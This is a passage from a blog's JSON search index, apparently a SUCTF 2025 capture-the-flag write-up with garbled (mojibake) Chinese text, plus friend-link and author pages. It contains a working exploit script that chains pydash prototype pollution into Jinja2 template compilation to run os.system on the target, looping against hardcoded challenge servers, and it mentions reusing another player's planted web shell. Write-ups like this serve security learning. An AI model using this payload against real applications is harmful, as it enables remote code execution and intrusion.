\u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) é™¤äº†ä¹‹å‰ç”¨åˆ°çš„æ¥å£ï¼Œåªå‰©ä¸‹ä¸€ä¸ª/Admin\nè¿™é‡Œæœ‰ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“ï¼Œä¸è¿‡é¢˜ç›®è¦æˆ‘ä»¬RCEï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ç»“åˆä¸€ä¸‹jinja2çš„ä¸€ä¸ªæ¨¡ç‰ˆæ¸²æŸ“\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwafé‡Œæ•°å­—åªå‰©ä¸‹2ï¼Œä¹Ÿæ˜¯æŒ‡å¼•æˆ‘ä»¬æ‰“jinja2\næˆ‘ä»¬è¿˜éœ€è¦è·å–sysæ¨¡å—ï¼Œä¸Šé¢æ–‡ç« é“¾æ¥ä¸­çš„ä¸€ä¸ªpayloadæ˜¯ç”¨äº†__loader__ï¼Œä½†æ˜¯è¿™é¢˜è¢«banäº†\né‚£æˆ‘ä»¬åªèƒ½ç”¨__spec__æ¥ä»£æ›¿__loader__æ¥è·å–åˆ°sysæ¨¡å—\nå› ä¸ºæ¨¡ç‰ˆç¼–è¯‘åªåœ¨ç¬¬ä¸€æ¬¡è®¿é—®æ—¶æ‰ç¼–è¯‘ï¼Œæ‰€ä»¥è¦å¡å®¹å™¨é‡å¯çš„ç¬¬ä¸€æ—¶é—´æ‰èƒ½æ‰“é€š\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery ç”±404é¡µé¢å¯ä»¥å¾ˆæ˜æ˜¾çš„çŸ¥é“æ˜¯ä¸€ä¸ªä¸´æ—¶æœåŠ¡php -Så¼€å¯çš„\nå†æ ¹æ®å»å¹´å‡ºçš„ä¸€ä¸ªæ´ï¼Œç”±php -Så¼€å¯çš„æœåŠ¡åœ¨ç‰¹å®šç‰ˆæœ¬ä¸‹èƒ½å¤Ÿè¯»å–æºç \nhttps://cloud.tencent.com/developer/article/2235691\næ‰€ä»¥è¿™é‡Œä¹Ÿæ˜¯æœ‰æ¨¡å­¦æ ·çš„æ‹¿åˆ°æºç \nåç»­æ‰“çš„æ—¶å€™ç¢°åˆ°åˆ«äººå†™çš„shellï¼Œç„¶åç”¨æºç æ³„æ¼çœ‹å‚æ•°å°±ç›´æ¥æ‰“è¿›å»äº†(è¿™ä¹Ÿæ˜¯å…¬å…±ç¯å¢ƒåšé¢˜æ€è·¯çš„ä¸€éƒ¨åˆ†å­xsl)\n","date":"2025-01-18T19:38:41+08:00","permalink":"http://localhost:1313/post/2025suctf/","section":"post","tags":null,"title":"2025-SUCTF-WP"},{"categories":null,"contents":" 1231 456 å‹é“¾åç§°2 å‹é“¾æè¿°2 ","date":"2025-01-18T01:22:01+08:00","permalink":"http://localhost:1313/friend/","section":"","tags":null,"title":"å‹é“¾"},{"categories":null,"contents":"ä¸€åå¤§äºŒåœ¨è¯»å­¦ç”Ÿ\nSyclover \u0026amp; 0XFFF æˆå‘˜\nå¯¹å„ç§å®‰å…¨æ„Ÿå…´è¶£ï¼Œç›®å‰ä¸»è¦å­¦ä¹ çš„è¿˜çš„æ˜¯Webå®‰å…¨ï¼ˆJava å®‰å…¨ã€äº‘å®‰å…¨ç­‰ï¼‰\næœ€çˆ±åƒï¼Œæœ€å–œæ¬¢åƒçš„æ˜¯ğŸ‰ï¼Œæœ€å–œæ¬¢å¹²çš„äº‹æƒ…å°±æ˜¯å¤§å¤å¤©æŠ±ç€åŠä¸ªè¥¿ç“œæ‹¿å‹ºå­æŒ–ç€åƒç„¶åçœ‹è§†é¢‘\nä¼šæ‰“ç‚¹å°æ¸¸æˆï¼ˆå…¶å®ä»å°å­¦ä¹‹å‰å°±å¼€å§‹æ‰“æ¸¸æˆäº†hh\nä»€ä¹ˆéƒ½æƒ³å­¦ï¼Œä½†ä»€ä¹ˆéƒ½ä¸ä¼š\nContact Me Email:gsbp6279@gmail.com\nGitHub:https://github.com/GSBP0/:\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/about/","section":"","tags":null,"title":"About Me"}]